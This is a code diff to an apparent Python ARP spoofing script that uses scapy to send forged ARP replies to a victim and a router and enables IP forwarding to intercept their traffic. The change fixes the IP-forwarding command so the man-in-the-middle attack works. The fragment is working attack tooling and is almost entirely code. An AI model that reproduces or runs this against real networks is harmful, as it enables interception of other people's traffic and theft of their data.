@@ -19,7 +19,7 @@ victim_packet = scapy.ARP(op = 2, pdst = victim_ip, hwdst = get_mac_from_ip(vict
 router_packet = scapy.ARP(op = 2, pdst = router_ip, hwdst = get_mac_from_ip(router_ip), psrc = victim_ip)
 
 FNULL = open(os.devnull, "w")
-subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"], stdout = FNULL)
+subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", stdout = FNULL, shell = True)
 print("[+] Enabled IP forwarding")
 
 try:
@@ -34,6 +34,6 @@ try:
 except KeyboardInterrupt:
 	print("\nStopped sending packets.")
 	print("Disabling IP forwarding and exiting the program..")
-	subprocess.call(["echo", "0", ">", "/proc/sys/net/ipv4/ip_forward"], stdout = FNULL)
+	subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", stdout = FNULL, shell = True)
 	FNULL.close()
 	sys.exit(0)
